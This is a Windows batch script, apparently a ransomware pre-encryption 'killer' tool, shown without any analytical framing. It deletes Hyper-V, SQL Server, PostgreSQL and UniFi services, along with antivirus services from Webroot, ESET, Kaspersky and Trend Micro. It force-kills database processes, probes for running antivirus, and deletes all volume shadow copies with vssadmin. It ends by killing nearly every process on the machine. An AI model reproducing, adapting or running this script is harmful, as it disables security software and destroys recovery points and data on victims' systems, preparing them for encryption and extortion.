@echo off
rem Delite Service "Hyper-V"
sc delete "vmickvpexchange"
sc delete "vmicguestinterface"
sc delete "vmicshutdown"
sc delete "vmicheartbeat"
sc delete "vmicrdv"
sc delete "storflt"
sc delete "vmictimesync"
sc delete "vmicvss"

rem Delite Service "SQL"
sc delete "MSSQLFDLauncher"
sc delete "MSSQLSERVER"
sc delete "SQLSERVERAGENT"
sc delete "SQLBrowser"
sc delete "SQLTELEMETRY"
sc delete "MsDtsServer130"
sc delete "SSISTELEMETRY130"
sc delete "SQLWriter"
sc delete "MSSQL$VEEAMSQL2012"
sc delete "SQLAgent$VEEAMSQL2012"
sc delete "MSSQL"
sc delete "SQLAgent"
sc delete "MSSQLServerADHelper100"
sc delete "MSSQLServerOLAPService"
sc delete "MsDtsServer100"
sc delete "ReportServer"
sc delete "SQLTELEMETRY$HL"
sc delete "TMBMServer"
sc delete "MSSQL$PROGID"
sc delete "MSSQL$WOLTERSKLUWER"
sc delete "SQLAgent$PROGID"
sc delete "SQLAgent$WOLTERSKLUWER"
sc delete "MSSQLFDLauncher$OPTIMA"
sc delete "MSSQL$OPTIMA"
sc delete "SQLAgent$OPTIMA"
sc delete "ReportServer$OPTIMA"
sc delete "msftesql$SQLEXPRESS"
sc delete "postgresql-x64-9.4"


rem Delite Service "AV: Webroot"
sc delete "WRSVC"

rem Delite Service "AV: ESET"
sc delete "ekrn"

rem Delite Service "AV: Kaspersky"
sc delete "klim6"
sc delete "AVP18.0.0"
sc delete "KLIF"
sc delete "klpd"
sc delete "klflt"
sc delete "klbackupdisk"
sc delete "klbackupflt"
sc delete "klkbdflt"
sc delete "klmouflt"
sc delete "klhk"
sc delete "KSDE1.0.0"
sc delete "kltap"

rem Delite Service "AV: Trend Micro"
sc delete "TmFilter"
sc delete "TMLWCSService"
sc delete "tmusa"
sc delete "TmPreFilter"
sc delete "TMSmartRelayService"
sc delete "TMiCRCScanService"
sc delete "VSApiNt"
sc delete "TmCCSF"
sc delete "tmlisten"
sc delete "TmProxy"
sc delete "ntrtscan"
sc delete "ofcservice"

rem Kill
sc delete "UniFi"


rem Kill "SQL"
taskkill -f -im sqlbrowser.exe
taskkill -f -im sqlwriter.exe
taskkill -f -im sqlservr.exe
taskkill -f -im msmdsrv.exe
taskkill -f -im MsDtsSrvr.exe
taskkill -f -im sqlceip.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im Ssms.exe
taskkill -f -im SQLAGENT.EXE
taskkill -f -im fdhost.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im sqlservr.exe
taskkill -f -im ReportingServicesService.exe
taskkill -f -im msftesql.exe
taskkill -f -im pg_ctl.exe
taskkill -f -im postgres.exe


rem Kill
taskkill -f -im UniFi.exe


Echo TIME TO FIND AV

tasklist /fi "imagename eq MsMpEng.exe" | find /c "PID" && Echo Windows Defender
tasklist /fi "imagename eq ntrtscan.exe" | find /c "PID" && Echo Trend Micro Security
tasklist /fi "imagename eq avp.exe" | find /c "PID" && Echo Kaspersky Endpoint Security
tasklist /fi "imagename eq WRSA.exe" | find /c "PID" && Echo Webroot
tasklist /fi "imagename eq egui.exe" | find /c "PID" && Echo ESET
tasklist /fi "imagename eq AvastUI.exe" | find /c "PID" && Echo Avast

Echo TIME TO KILL ALL

vssadmin.exe Delete Shadows /All /Quiet

TASKKILL /F /FI "PID ge 1000" /FI "WINDOWTITLE ne untitle*"